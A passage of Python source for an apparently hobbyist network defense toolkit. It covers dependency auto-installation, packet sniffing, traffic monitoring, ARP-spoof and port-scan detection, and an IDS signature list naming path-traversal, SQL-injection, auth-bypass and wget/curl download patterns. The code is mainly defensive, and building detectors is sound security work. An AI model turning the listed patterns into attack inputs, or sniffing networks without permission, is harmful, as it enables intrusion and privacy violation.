#!/usr/bin/env python3
"""
Darkie Security Suite v2 — Advanced Cybersecurity & Network Defense Platform
Educational use only. Test only systems you own or have permission to test.
"""

import base64
import csv
import hashlib
import importlib
import json
import os
import platform
import random
import re
import shutil
import socket
import ssl
import string
import struct
import subprocess
import sys
import time
import warnings
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime as dt
from urllib.parse import urlparse

warnings.filterwarnings("ignore")

MISSING_PIPS = []
MISSING_SYSTEM = []

PIP_DEPS = {
    "colorama": "colorama",
    "requests": "requests",
    "psutil": "psutil",
    "cryptography": "cryptography",
}

PIP_OPTIONAL = {
    "scapy": "scapy",
}

SYSTEM_DEPS_COMMON = {
    "nmap": "nmap",
    "host": "host",
    "dig": "bind9-dnsutils",
    "whois": "whois",
    "traceroute": "traceroute",
    "aircrack-ng": "aircrack-ng",
    "tcpdump": "tcpdump",
    "iptables": "iptables",
}

SYSTEM_DEPS_BY_MGR = {
    "apt":     {"host": "dnsutils", "dig": "dnsutils", "whois": "whois", "tcpdump": "tcpdump", "iptables": "iptables"},
    "dnf":     {"host": "bind-utils", "dig": "bind-utils", "whois": "whois", "tcpdump": "tcpdump", "iptables": "iptables"},
    "pacman":  {"host": "bind-tools", "dig": "bind-tools", "whois": "whois", "tcpdump": "tcpdump", "iptables": "iptables"},
    "apk":     {"host": "bind-tools", "dig": "bind-tools", "whois": "whois", "tcpdump": "tcpdump", "iptables": "iptables"},
    "zypper":  {"host": "bind-utils", "dig": "bind-utils", "whois": "whois", "tcpdump": "tcpdump", "iptables": "iptables"},
    "brew":    {"host": "bind", "dig": "bind", "whois": "whois", "tcpdump": "tcpdump", "iptables": ""},
    "choco":   {"host": "bind-tool", "dig": "bind-tool", "whois": "whois", "tcpdump": "", "iptables": ""},
}

GRADIENT = [
    "\033[38;5;196m", "\033[38;5;197m", "\033[38;5;198m", "\033[38;5;199m",
    "\033[38;5;200m", "\033[38;5;201m", "\033[38;5;129m", "\033[38;5;93m",
]

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

SYM_CHECK = "\u2713"
SYM_X = "\u2717"
SYM_WARN = "\u26a0"
SYM_ARROW = "\u2192"
SYM_PROMPT = "\u279c"
SYM_BLOCK_FULL = "\u2588"
SYM_BLOCK_EMPTY = "\u2591"
SYM_BOX_TL = "\u2554"
SYM_BOX_TR = "\u2557"
SYM_BOX_BL = "\u255a"
SYM_BOX_BR = "\u255d"
SYM_BOX_H = "\u2550"
SYM_BOX_V = "\u2551"
SYM_LINE_H = "\u2500"
SYM_LINE_V = "\u251c"

SCAN_RUNNING = False
LOG_ALERTS = []
SYM_CLOCK = "\u23f0"
SAVE_DIR = os.path.expanduser("~/.darkie_reports")


def _ensure_save_dir():
    os.makedirs(SAVE_DIR, exist_ok=True)


def _save_results(module_name, data):
    _ensure_save_dir()
    ts = dt.now().strftime("%Y%m%d_%H%M%S")
    fname = f"{module_name}_{ts}.json"
    fpath = os.path.join(SAVE_DIR, fname)
    try:
        with open(fpath, "w") as f:
            json.dump(data, f, indent=2, default=str)
        print(f"  {GREEN}{SYM_CHECK} Results saved: {fpath}{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Failed to save results: {e}{RESET}")


def _prompt_export(module_name, data):
    choice = input(f"  {c(f'Save results to JSON? (y/n) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if choice == "y":
        _save_results(module_name, data)


def _is_root():
    return os.geteuid() == 0 if hasattr(os, "geteuid") else False


def _check_root(require_scapy=False):
    if require_scapy and not HAS_SCAPY:
        print(f"  {YELLOW}scapy not installed. Install: pip install scapy{RESET}")
        print(f"  {YELLOW}Falling back to limited functionality.{RESET}")
        return True
    if not _is_root():
        if require_scapy or HAS_SCAPY:
            print(f"  {RED}{SYM_WARN} Root privileges required for this feature.{RESET}")
            print(f"  {YELLOW}Run with: sudo python3 {sys.argv[0] if sys.argv else 'tool.py'}{RESET}")
            return False
    return True


def _detect_os():
    system = platform.system().lower()
    if system == "linux":
        try:
            with open("/etc/os-release") as f:
                data = f.read()
        except FileNotFoundError:
            return "linux", "unknown"
        if re.search(r'ID=("?)debian', data) or re.search(r'ID_LIKE=.*debian', data):
            return "linux", "apt"
        if re.search(r'ID=("?)(ubuntu|linuxmint|pop|kali)', data):
            return "linux", "apt"
        if re.search(r'ID=("?)(rhel|centos|fedora|rocky|alma)', data):
            return "linux", "dnf"
        if re.search(r'ID=("?)(arch|manjaro|endeavour)', data):
            return "linux", "pacman"
        if re.search(r'ID=("?)alpine', data):
            return "linux", "apk"
        if re.search(r'ID=("?)(opensuse|suse)', data):
            return "linux", "zypper"
        return "linux", "unknown"
    elif system == "darwin":
        return "macos", "brew"
    elif system == "windows":
        return "windows", "choco"
    return system, "unknown"


def _check_pip_deps():
    global MISSING_PIPS
    for mod, pkg in PIP_DEPS.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            MISSING_PIPS.append(pkg)


def _check_system_deps():
    global MISSING_SYSTEM
    _, pkg_mgr = _detect_os()
    per_mgr = SYSTEM_DEPS_BY_MGR.get(pkg_mgr, {})
    for cmd, default_pkg in SYSTEM_DEPS_COMMON.items():
        if shutil.which(cmd) is None:
            pkg = per_mgr.get(cmd, default_pkg)
            if pkg:
                MISSING_SYSTEM.append((cmd, pkg))


PKG_MANAGERS = {
    "apt":     {"install": ["apt-get", "install", "-y", "-qq"], "update": ["apt-get", "update", "-qq"]},
    "dnf":     {"install": ["dnf", "install", "-y"], "update": None},
    "pacman":  {"install": ["pacman", "-S", "--noconfirm"], "update": ["pacman", "-Sy"]},
    "apk":     {"install": ["apk", "add"], "update": ["apk", "update"]},
    "zypper":  {"install": ["zypper", "install", "-y"], "update": ["zypper", "refresh"]},
    "brew":    {"install": ["brew", "install"], "update": ["brew", "update"]},
    "choco":   {"install": ["choco", "install", "-y"], "update": None},
}


def _run_as_admin(cmd_list, reason=""):
    desc = " ".join(cmd_list)
    print(f"  {CYAN}{reason or desc}{RESET}")
    try:
        r = subprocess.run(cmd_list, capture_output=True, text=True, timeout=300)
        if r.returncode == 0:
            print(f"  {GREEN}{SYM_CHECK}  Success{RESET}")
        else:
            print(f"  {RED}{SYM_X}  Failed (exit {r.returncode}){RESET}")
            if r.stderr.strip():
                for line in r.stderr.strip().splitlines()[-3:]:
                    print(f"    {RED}{line}{RESET}")
        return r.returncode == 0
    except Exception as e:
        print(f"  {RED}{SYM_X}  Error: {e}{RESET}")
        return False


def _ensure_pip_installed():
    try:
        importlib.import_module("pip")
        return True
    except ImportError:
        pass
    try:
        import ensurepip
        print(f"  {YELLOW}Pip not found. Bootstrapping via ensurepip...{RESET}")
        subprocess.check_call([sys.executable, "-m", "ensurepip", "--upgrade"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        importlib.import_module("pip")
        return True
    except Exception:
        pass
    os_name, pkg_mgr = _detect_os()
    pip_pkg_map = {
        "apt": "python3-pip",
        "dnf": "python3-pip",
        "pacman": "python-pip",
        "apk": "py3-pip",
        "zypper": "python3-pip",
    }
    pkg = pip_pkg_map.get(pkg_mgr)
    if not pkg:
        print(f"  {RED}{SYM_X}  Don't know how to install pip on {os_name}/{pkg_mgr}.{RESET}")
        print(f"  {YELLOW}Try: python3 -m ensurepip --upgrade  or install pip manually.{RESET}")
        return False
    print(f"  {YELLOW}Pip not found. Installing {pkg} via {pkg_mgr}...{RESET}")
    info = PKG_MANAGERS.get(pkg_mgr)
    if info is None:
        return False
    if info.get("update"):
        _run_as_admin(info["update"], f"Updating {pkg_mgr} cache")
    success = _run_as_admin(info["install"] + [pkg], f"Installing {pkg}")
    if success:
        try:
            importlib.import_module("pip")
            return True
        except ImportError:
            pass
    return False


def _install_missing():
    _, pkg_mgr = _detect_os()
    if MISSING_PIPS:
        if _ensure_pip_installed():
            print(f"\n  {YELLOW}Installing Python packages: {', '.join(MISSING_PIPS)}{RESET}")
            pip_cmd = [sys.executable, "-m", "pip", "install"] + MISSING_PIPS
            _run_as_admin(pip_cmd, "pip install " + " ".join(MISSING_PIPS))
        else:
            print(f"  {RED}{SYM_X}  Cannot install Python packages (pip unavailable).{RESET}")
    if MISSING_SYSTEM:
        missing_names = [pkg for _, pkg in MISSING_SYSTEM]
        print(f"\n  {YELLOW}Installing system packages: {', '.join(missing_names)}{RESET}")
        info = PKG_MANAGERS.get(pkg_mgr)
        if info is None:
            print(f"  {RED}{SYM_X}  Unsupported package manager{RESET}")
            return
        for cmd, pkg in MISSING_SYSTEM:
            if info["update"]:
                _run_as_admin(info["update"], f"Updating {pkg_mgr} cache")
                break
        install_cmd = info["install"] + [pkg for _, pkg in MISSING_SYSTEM]
        _run_as_admin(install_cmd, f"Installing with {pkg_mgr}")


def ensure_deps():
    global MISSING_PIPS, MISSING_SYSTEM
    print(f"\n{CYAN}{BOLD}{SYM_BOX_TL}{'='*50}{SYM_BOX_TR}{RESET}")
    print(f"{CYAN}{BOLD}{SYM_BOX_V}  Checking dependencies...{' ' * 29}{SYM_BOX_V}{RESET}")
    print(f"{CYAN}{BOLD}{SYM_BOX_BL}{'='*50}{SYM_BOX_BR}{RESET}")
    _check_pip_deps()
    if MISSING_PIPS:
        print(f"  {YELLOW}{SYM_WARN}  Missing Python packages: {', '.join(MISSING_PIPS)}{RESET}")
        if _ensure_pip_installed():
            print(f"  {CYAN}Auto-installing Python packages...{RESET}")
            _run_as_admin([sys.executable, "-m", "pip", "install"] + MISSING_PIPS, "pip install missing packages")
            MISSING_PIPS = []
            _check_pip_deps()
            if MISSING_PIPS:
                print(f"  {RED}{SYM_X}  Some Python deps still missing. Try: pip install {' '.join(MISSING_PIPS)}{RESET}")
            else:
                print(f"  {GREEN}{SYM_CHECK}  Python dependencies satisfied!{RESET}")
        else:
            print(f"  {RED}{SYM_X}  Cannot install Python packages (pip unavailable). Install python3-pip manually.{RESET}")
    _check_system_deps()
    if MISSING_SYSTEM:
        missing_names = [pkg for _, pkg in MISSING_SYSTEM]
        print(f"  {YELLOW}{SYM_WARN}  Missing system tools: {', '.join(missing_names)}{RESET}")
        if _is_root():
            print(f"  {CYAN}Auto-installing system tools (running as root)...{RESET}")
            _install_missing()
            MISSING_SYSTEM = []
            _check_system_deps()
            if MISSING_SYSTEM:
                print(f"  {RED}{SYM_X}  Some system tools still missing. Install manually.{RESET}")
            else:
                print(f"  {GREEN}{SYM_CHECK}  System dependencies satisfied!{RESET}")
        else:
            ans = input(f"  {CYAN}{BOLD}Install missing system tools? (y/n) {SYM_PROMPT} {RESET}").strip().lower()
            if ans == "y":
                _install_missing()
                MISSING_SYSTEM = []
                _check_system_deps()
                if MISSING_SYSTEM:
                    print(f"  {RED}{SYM_X}  Some system tools still missing. Install manually.{RESET}")
                else:
                    print(f"  {GREEN}{SYM_CHECK}  System dependencies satisfied!{RESET}")
            else:
                print(f"  {YELLOW}Skipping system tool installation. Some features may be limited.{RESET}")
    elif not MISSING_PIPS:
        print(f"  {GREEN}{SYM_CHECK}  All dependencies found!{RESET}")


ensure_deps()

from colorama import init, Fore, Style, Back
import requests

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import scapy.all as scapy
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

init(autoreset=True)


BANNER_LINES = [
    " ____             _    _         _____ ___   ___  _     ____  ",
    "|  _ \  __ _ _ __| | _(_) ___   |_   _/ _ \ / _ \| |   / ___| ",
    "| | | |/ _` | '__| |/ / |/ _ \    | || | | | | | | |   \___ \ ",
    "| |_| | (_| | |  |   <| |  __/    | || |_| | |_| | |___ ___) |",
    "|____/ \__,_|_|  |_|\_\_|\___|    |_| \___/ \___/|_____|____/ ",
    "                                                              ",
]


def c(string, color=Fore.GREEN):
    return f"{color}{Style.BRIGHT}{string}{Style.RESET_ALL}"


def c_dim(string, color=Fore.GREEN):
    return f"{color}{Style.DIM}{string}{Style.RESET_ALL}"


def gradient_line(line):
    out = ""
    for i, ch in enumerate(line):
        idx = min(i % len(GRADIENT), len(GRADIENT) - 1)
        out += f"{GRADIENT[idx]}{Style.BRIGHT}{ch}{RESET}"
    return out


def gradient_banner():
    for line in BANNER_LINES:
        print(f"  {gradient_line(line)}")


def header_box(title, color=Fore.CYAN, width=66):
    top = f"{color}{Style.BRIGHT}{SYM_BOX_TL}{'='*(width-2)}{SYM_BOX_TR}{Style.RESET_ALL}"
    mid = f"{color}{Style.BRIGHT}{SYM_BOX_V} {title.center(width-4)} {SYM_BOX_V}{Style.RESET_ALL}"
    bot = f"{color}{Style.BRIGHT}{SYM_BOX_BL}{'='*(width-2)}{SYM_BOX_BR}{Style.RESET_ALL}"
    print(f"\n{top}\n{mid}\n{bot}\n")


def info_box(title, content_lines, color=Fore.CYAN):
    width = 60
    print(f"  {color}{Style.BRIGHT}{SYM_BOX_TL}{'='*width}{SYM_BOX_TR}{Style.RESET_ALL}")
    print(f"  {color}{Style.BRIGHT}{SYM_BOX_V}  {title.center(width-4)}  {SYM_BOX_V}{Style.RESET_ALL}")
    print(f"  {color}{Style.BRIGHT}{SYM_BOX_V}{'='*width}{SYM_BOX_V}{Style.RESET_ALL}")
    for line in content_lines:
        clean = re.sub(r'\033\[[0-9;]*m', '', line)
        label = f"  {color}{Style.BRIGHT}{SYM_BOX_V}{Style.RESET_ALL}  {line}"
        if len(clean) > width - 2:
            label = label[:width + 20] + "..."
        print(f"  {label}")
    print(f"  {color}{Style.BRIGHT}{SYM_BOX_BL}{'='*width}{SYM_BOX_BR}{Style.RESET_ALL}")


def animate_banner():
    for line in BANNER_LINES:
        if line.strip():
            colored = "".join(f"{GRADIENT[min(i % len(GRADIENT), len(GRADIENT)-1)]}{Style.BRIGHT}{ch}{RESET}" for i, ch in enumerate(line))
            print(f"  {colored}")
        else:
            print()
        time.sleep(0.04)
    time.sleep(0.15)
    title = "Darkie TOOLS v2.2 — Ultimate Cyber Toolkit"
    print(f"\n{CYAN}{BOLD}{SYM_BOX_TL}{'='*62}{SYM_BOX_TR}{RESET}")
    time.sleep(0.05)
    for i in range(0, len(title)+1):
        sys.stdout.write(f"\r{CYAN}{BOLD}{SYM_BOX_V}  {title[:i]:<62}  {SYM_BOX_V}{RESET}")
        sys.stdout.flush()
        time.sleep(0.02)
    print(f"\n{CYAN}{BOLD}{SYM_BOX_BL}{'='*62}{SYM_BOX_BR}{RESET}")
    time.sleep(0.1)
    print(f"  {c(SYM_CLOCK + ' Author:', Fore.CYAN)} Darkie Tester")
    print(f"  {c(SYM_WARN + ' Purpose:', Fore.CYAN)} Ultimate cybersecurity toolkit — 100+ tools\n")
    print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT} DISCLAIMER {Style.RESET_ALL}{Fore.YELLOW}  Educational use only. You must own or have permission to test the target systems.{Style.RESET_ALL}")
    print()

def print_banner():
    animate_banner()


def add_log_alert(level, source, message):
    timestamp = dt.now().strftime("%Y-%m-%d %H:%M:%S")
    LOG_ALERTS.append({"timestamp": timestamp, "level": level, "source": source, "message": message})


def progress_bar(current, total, bar_len=15):
    filled = int(bar_len * current // total) if total else 0
    bar = f"{Fore.GREEN}{SYM_BLOCK_FULL*filled}{Fore.WHITE}{SYM_BLOCK_EMPTY*(bar_len-filled)}{Style.RESET_ALL}"
    return f"[{bar}] {Fore.CYAN}{current}/{total}{Style.RESET_ALL}"


# ──────────────────────────────────────────────────────────
#  MODULE 1: NETWORK & THREAT MONITORING
# ──────────────────────────────────────────────────────────

def _detect_interfaces():
    ifaces = []
    system = platform.system().lower()
    if system == "linux":
        try:
            r = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
            ifaces = [i for i in re.findall(r'^\d+:\s+(\w+)', r.stdout, re.MULTILINE) if i != "lo"]
        except Exception:
            pass
        if not ifaces:
            try:
                r = subprocess.run(["ifconfig", "-a"], capture_output=True, text=True)
                ifaces = re.findall(r'^(\w+)\s+:', r.stdout, re.MULTILINE)
                ifaces = [i for i in ifaces if i != "lo"]
            except Exception:
                pass
    elif system == "darwin":
        try:
            r = subprocess.run(["ifconfig", "-l"], capture_output=True, text=True)
            ifaces = r.stdout.strip().split()
            ifaces = [i for i in ifaces if i != "lo0"]
        except Exception:
            pass
    elif system == "windows":
        try:
            r = subprocess.run(["ipconfig"], capture_output=True, text=True, encoding="utf-8", errors="replace")
            ifaces = re.findall(r'Adapter (\S.+):', r.stdout)
        except Exception:
            pass
    return ifaces if ifaces else ["eth0"] if system == "linux" else ["en0"] if system == "darwin" else ["eth0"]

def net_capture(interface=None, count=50):
    header_box("Packet Capture & Analysis", Fore.RED)
    if not _check_root(require_scapy=True):
        return
    if not HAS_SCAPY:
        print(f"  {YELLOW}scapy not installed. Using raw socket capture (limited).{RESET}")
        print(f"  {YELLOW}Install scapy for full packet analysis: pip install scapy{RESET}")

    system = platform.system().lower()
    if not interface:
        ifaces = _detect_interfaces()
        if len(ifaces) > 1:
            print(f"\n  {c('Available interfaces:', Fore.CYAN)}")
            for i, iface in enumerate(ifaces, 1):
                print(f"    {c(f'[{i}]', Fore.GREEN)} {iface}")
            choice = input(f"\n  {c(f'Select interface {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
                interface = ifaces[int(choice) - 1]
            else:
                interface = ifaces[0]
        else:
            interface = ifaces[0] if ifaces else "eth0"

    count_input = input(f"  {c(f'Packets to capture (default 50) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    count = int(count_input) if count_input.isdigit() else 50

    print(f"\n  {c(f'Capturing {count} packets on {interface}...', Fore.RED)}")
    print(f"  {c('Press Ctrl+C to stop early', Fore.YELLOW)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    captured = 0
    start = time.time()

    if HAS_SCAPY:
        try:
            packets = scapy.sniff(iface=interface, count=count, timeout=30)
            for pkt in packets:
                captured += 1
                ts = dt.now().strftime("%H:%M:%S.%f")[:-3]
                summary = pkt.summary()
                if len(summary) > 80:
                    summary = summary[:77] + "..."
                print(f"  {c(f'[{ts}]', Fore.GREEN)} {c(summary, Fore.CYAN)}")

                # Basic threat detection
                if pkt.haslayer(scapy.IP):
                    src = pkt[scapy.IP].src
                    dst = pkt[scapy.IP].dst
                    if pkt.haslayer(scapy.TCP):
                        dport = pkt[scapy.TCP].dport
                        if dport == 22:
                            add_log_alert("INFO", "Packet Capture", f"SSH connection: {src} -> {dst}")
                        if dport in (23, 3389):
                            add_log_alert("WARN", "Packet Capture", f"Remote access: {src} -> {dst}:{dport}")
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"  {RED}{SYM_X} Capture error: {e}{RESET}")
    else:
        try:
            if system == "linux":
                sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
                sock.settimeout(1)
                sock.bind((interface, 0))
                while captured < count:
                    try:
                        data, addr = sock.recvfrom(65535)
                        captured += 1
                        ts = dt.now().strftime("%H:%M:%S.%f")[:-3]
                        mac = ":".join(f"{b:02x}" for b in data[:6])
                        print(f"  {c(f'[{ts}]', Fore.GREEN)} Packet from {c(mac, Fore.CYAN)} ({len(data)} bytes)")
                    except socket.timeout:
                        continue
                sock.close()
            elif system == "darwin" or system == "windows":
                print(f"  {YELLOW}Raw packet capture requires scapy on this platform.{RESET}")
                print(f"  {YELLOW}Install: pip install scapy{RESET}")
            else:
                print(f"  {YELLOW}Raw capture not supported on {system}. Install scapy.{RESET}")
        except PermissionError:
            print(f"  {RED}{SYM_X} Root privileges required for packet capture.{RESET}")
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")

    elapsed = time.time() - start
    print(f"\n  {c(SYM_CHECK + f' Captured {captured} packets in {elapsed:.1f}s', Fore.GREEN)}")
    print()


def net_traffic_monitor():
    header_box("Real-time Traffic Monitor", Fore.RED)
    if not HAS_PSUTIL:
        print(f"  {YELLOW}psutil not installed. Install for full monitoring: pip install psutil{RESET}")
        print(f"  {YELLOW}Showing basic network stats only.{RESET}")

    duration = input(f"  {c(f'Monitor duration (seconds, default 10) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    duration = int(duration) if duration.isdigit() else 10
    interval = 1

    print(f"\n  {c(f'Monitoring traffic for {duration}s...', Fore.RED)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    try:
        if HAS_PSUTIL:
            old_stats = psutil.net_io_counters(pernic=True)
            for sec in range(duration):
                time.sleep(interval)
                new_stats = psutil.net_io_counters(pernic=True)
                sys.stdout.write(f"\r  {c(f'Second {sec+1}/{duration}', Fore.CYAN)}  ")
                for iface in new_stats:
                    if iface in old_stats:
                        sent = new_stats[iface].bytes_sent - old_stats[iface].bytes_sent
                        recv = new_stats[iface].bytes_recv - old_stats[iface].bytes_recv
                        if sent > 0 or recv > 0:
                            up_arrow = "\u2191"
                            down_arrow = "\u2193"
                            sys.stdout.write(f"{c(f'{iface}:', Fore.GREEN)} {c(f'{up_arrow}{sent/1024:.1f}KB', Fore.YELLOW)} {c(f'{down_arrow}{recv/1024:.1f}KB', Fore.CYAN)}  ")
                sys.stdout.flush()
                old_stats = new_stats
            print()
        else:
            system = platform.system().lower()
            old_data = None
            if system == "linux":
                try:
                    with open("/proc/net/dev") as f:
                        old_data = f.read()
                except Exception:
                    pass
            for sec in range(duration):
                time.sleep(interval)
                if old_data:
                    try:
                        with open("/proc/net/dev") as f:
                            new_data = f.read()
                        sys.stdout.write(f"\r  {c(f'Second {sec+1}/{duration}', Fore.CYAN)}  {c('(install psutil for per-interface stats)', Fore.DIM)}")
                    except Exception:
                        sys.stdout.write(f"\r  {c(f'Second {sec+1}/{duration}', Fore.CYAN)}")
                else:
                    sys.stdout.write(f"\r  {c(f'Second {sec+1}/{duration}', Fore.CYAN)}  {c('(install psutil for traffic stats)', Fore.YELLOW)}")
                sys.stdout.flush()
            print()

        print(f"\n  {c(SYM_CHECK + ' Monitoring complete', Fore.GREEN)}")
    except KeyboardInterrupt:
        print(f"\n  {c(SYM_WARN + ' Stopped by user', Fore.YELLOW)}")
    print()


SIGNATURES = [
    (r"GET /admin", "Admin page access", "MEDIUM"),
    (r"GET /\.env", "Environment file access", "HIGH"),
    (r"GET /\.git", "Git repo exposure", "HIGH"),
    (r"SELECT.*FROM", "SQL injection attempt", "HIGH"),
    (r"<script>", "XSS attempt", "HIGH"),
    (r"UNION.*SELECT", "SQL injection (UNION)", "CRITICAL"),
    (r"exec\(|system\(|passthru\(", "PHP code execution attempt", "CRITICAL"),
    (r"admin' OR '1'='1", "SQL auth bypass attempt", "CRITICAL"),
    (r"/etc/passwd", "Path traversal attempt", "HIGH"),
    (r"../..", "Directory traversal", "MEDIUM"),
    (r"wget |curl ", "Remote file download", "MEDIUM"),
    (r"DROP TABLE", "SQL DROP attempt", "CRITICAL"),
    (r"cmd=", "Command injection", "HIGH"),
    (r"../../etc", "Deep path traversal", "HIGH"),
    (r"load_file\(", "MySQL file read attempt", "CRITICAL"),
]


def net_ids():
    header_box("IDS Signature Detection", Fore.RED)
    print(f"  {c('Loaded signatures:', Fore.CYAN)} {len(SIGNATURES)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    for pattern, desc, severity in SIGNATURES:
        sev_color = Fore.RED if severity in ("CRITICAL", "HIGH") else Fore.YELLOW
        print(f"    {c(f'[{severity:8s}]', sev_color)} {c(desc, Fore.GREEN)}")
        print(f"    {' ' * 14}{c_dim(pattern, Fore.WHITE)}")
    print(f"\n  {c('Total signatures loaded: 15', Fore.GREEN)}")

    test_data = input(f"\n  {c(f'Test a log line against signatures {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if test_data:
        print(f"\n  {c('Results:', Fore.CYAN)}")
        for pattern, desc, severity in SIGNATURES:
            if re.search(pattern, test_data, re.IGNORECASE):
                sev_color = Fore.RED if severity in ("CRITICAL", "HIGH") else Fore.YELLOW
                print(f"    {c(f'[{severity}]', sev_color)} {c(desc, Fore.GREEN)} {c(SYM_CHECK, Fore.GREEN)}")
                add_log_alert(severity, "IDS", f"Signature matched: {desc} in: {test_data[:80]}")
        print()


def _get_gateway():
    system = platform.system().lower()
    try:
        if system == "linux":
            r = subprocess.run(["ip", "route", "show"], capture_output=True, text=True, timeout=5)
            gw = re.search(r'default via (\S+)', r.stdout)
            return gw.group(1) if gw else None
        elif system == "darwin":
            r = subprocess.run(["route", "-n", "get", "default"], capture_output=True, text=True, timeout=5)
            gw = re.search(r'gateway:\s+(\S+)', r.stdout)
            return gw.group(1) if gw else None
        elif system == "windows":
            r = subprocess.run(["route", "print", "0.0.0.0"], capture_output=True, text=True, timeout=5, encoding="utf-8", errors="replace")
            gw = re.search(r'0\.0\.0\.0\s+0\.0\.0\.0\s+(\S+)', r.stdout)
            return gw.group(1) if gw else None
    except Exception:
        pass
    return None

def net_arp_detect():
    header_box("ARP Spoofing Detector", Fore.RED)
    if not _check_root(require_scapy=HAS_SCAPY):
        return
    if not HAS_SCAPY:
        print(f"  {YELLOW}scapy required for ARP detection. Install: pip install scapy{RESET}")
        print(f"  {YELLOW}Checking gateway ARP manually...{RESET}")

    ifaces = _detect_interfaces()
    default_iface = ifaces[0] if ifaces else ("eth0" if platform.system().lower() == "linux" else "en0")
    iface = input(f"  {c(f'Interface (default {default_iface}) {SYM_PROMPT} ', Fore.CYAN)}").strip() or default_iface

    gateway = _get_gateway()
    if gateway:
        print(f"  {c('Gateway:', Fore.CYAN)} {gateway}")

    if HAS_SCAPY:
        print(f"\n  {c('Sending ARP request for gateway...', Fore.CYAN)}")
        try:
            arp_req = scapy.ARP(pdst=gateway or "192.168.1.1")
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_req
            answered = scapy.srp(packet, timeout=3, iface=iface, verbose=False)[0]

            if answered:
                for sent, recv in answered:
                    print(f"    {c('IP:', Fore.GREEN)} {recv.psrc}  {c('MAC:', Fore.CYAN)} {recv.hwsrc}")
                    add_log_alert("INFO", "ARP Scan", f"Host {recv.psrc} has MAC {recv.hwsrc}")
            else:
                print(f"  {YELLOW}No ARP responses.{RESET}")

            print(f"\n  {c('Passive ARP monitoring (5s)...', Fore.CYAN)}")
            arp_packets = scapy.sniff(iface=iface, filter="arp", count=10, timeout=5)
            ip_mac_map = {}
            for pkt in arp_packets:
                if pkt.haslayer(scapy.ARP):
                    src_ip = pkt[scapy.ARP].psrc
                    src_mac = pkt[scapy.ARP].hwsrc
                    if src_ip in ip_mac_map and ip_mac_map[src_ip] != src_mac:
                        print(f"  {RED}{SYM_WARN} ARP SPOOF DETECTED: {src_ip} changed from {ip_mac_map[src_ip]} to {src_mac}{RESET}")
                        add_log_alert("CRITICAL", "ARP Detector", f"ARP spoof: {src_ip} MAC changed to {src_mac}")
                    ip_mac_map[src_ip] = src_mac
                    print(f"    {c(f'{src_ip:15s}', Fore.GREEN)} {c(src_mac, Fore.CYAN)}")
        except Exception as e:
            print(f"  {RED}{SYM_X} ARP detection error: {e}{RESET}")
    else:
        try:
            system = platform.system().lower()
            arp_cmd = ["arp", "-a"] if system in ("darwin", "windows") else ["arp", "-n"]
            r = subprocess.run(arp_cmd, capture_output=True, text=True)
            print(f"\n  {c('ARP Cache:', Fore.CYAN)}")
            for line in r.stdout.splitlines():
                if line.strip():
                    print(f"    {c(line, Fore.GREEN)}")
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def net_portscan_detect():
    header_box("Port Scan Detection", Fore.RED)
    if not _check_root(require_scapy=True):
        return
    system = platform.system().lower()
    if not HAS_SCAPY:
        print(f"  {YELLOW}scapy required for real-time detection. Install: pip install scapy{RESET}")
        print(f"  {YELLOW}Falling back to connection-based detection.{RESET}")
    ifaces = _detect_interfaces()
    default_iface = ifaces[0] if ifaces else ("eth0" if system == "linux" else "en0")
    iface = input(f"  {c(f'Interface (default {default_iface}) {SYM_PROMPT} ', Fore.CYAN)}").strip() or default_iface
    duration = input(f"  {c(f'Monitor duration (seconds, default 15) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    duration = int(duration) if duration.isdigit() else 15
    threshold = input(f"  {c(f'Port count threshold (default 10) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    threshold = int(threshold) if threshold.isdigit() else 10

    print(f"\n  {c(f'Monitoring for port scans on {iface} ({duration}s)...', Fore.RED)}")
    print(f"  {c(f'Threshold: >{threshold} distinct ports from same IP = scan alert', Fore.YELLOW)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    connections = defaultdict(set)
    start = time.time()

    try:
        if HAS_SCAPY:
            def process_pkt(pkt):
                if pkt.haslayer(scapy.IP) and pkt.haslayer(scapy.TCP):
                    src = pkt[scapy.IP].src
                    dport = pkt[scapy.TCP].dport
                    connections[src].add(dport)

            scapy.sniff(iface=iface, prn=process_pkt, timeout=duration, store=False)
        else:
            while time.time() - start < duration:
                try:
                    if system == "linux":
                        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
                        sock.settimeout(1)
                        sock.bind((iface, 0))
                        data, _ = sock.recvfrom(65535)
                        sock.close()
                    else:
                        time.sleep(1)
                except Exception:
                    break

        print()
        for src, ports in sorted(connections.items()):
            if len(ports) > threshold:
